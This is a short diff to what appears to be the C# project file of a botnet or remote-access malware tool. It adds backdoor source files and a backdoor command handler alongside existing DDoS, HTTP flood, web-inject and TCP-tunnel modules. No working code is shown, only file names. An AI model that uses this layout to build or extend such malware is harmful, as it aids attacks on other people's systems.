@@ -41,6 +41,7 @@
     <Reference Include="System" />
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="Actions\Backdoor\Backdoor.cs" />
     <Compile Include="Actions\DDoS\Attack.cs" />
     <Compile Include="Actions\DDoS\Attacker.cs" />
     <Compile Include="Actions\DDoS\HttpFlood.cs" />
@@ -55,8 +56,10 @@
     <Compile Include="Network\Comunication\TCP\TcpTunnel.cs" />
     <Compile Include="Actions\WebInject\HttpClient.cs" />
     <Compile Include="Network\DnsEndPoint.cs" />
+    <Compile Include="Network\Protocol\Handlers\Command\BackdoorHandler.cs" />
     <Compile Include="Network\Protocol\Handlers\Command\DosAttackHandler.cs" />
     <Compile Include="Network\Protocol\Handlers\System\PingPongMessageHandler.cs" />
+    <Compile Include="Network\Protocol\Messages\Command\BackdoorMessage.cs" />
     <Compile Include="Network\Protocol\Messages\Command\GetSystemInfo.cs" />
     <Compile Include="Network\Protocol\Messages\Command\DosAttackMessage.cs" />
     <Compile Include="Network\Protocol\Messages\System\PingPongMessage.cs" />
